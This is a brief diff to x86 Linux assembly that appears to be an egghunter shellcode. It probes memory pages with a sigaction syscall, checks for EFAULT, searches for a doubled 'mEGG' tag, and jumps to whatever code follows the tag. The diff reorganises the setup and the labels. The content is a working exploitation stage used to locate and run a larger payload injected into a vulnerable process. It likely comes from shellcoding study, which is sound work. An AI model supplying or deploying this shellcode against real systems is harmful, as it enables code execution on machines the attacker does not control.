@@ -5,22 +5,28 @@ global _start
 
 section .text
 
-_align:
+_start:
+
+    cld
+    xor ecx, ecx
+    mul ecx
+
+AlignFunc:
 
     or cx, 0xfff
 
-_start:
-
+Search:
+    
     inc ecx
     push byte 0x43
     pop eax
     int 0x80
     cmp al, 0xf2
-    jz _align
-    mov eax, 0x4747456d ; mEGG
+    jz AlignFunc
+    mov eax, 0x4747456d ; Our Egg
     mov edi, ecx
     scasd
-    jnz _start
+    jnz Search
     scasd
-    jnz _start
+    jnz Search
     jmp edi
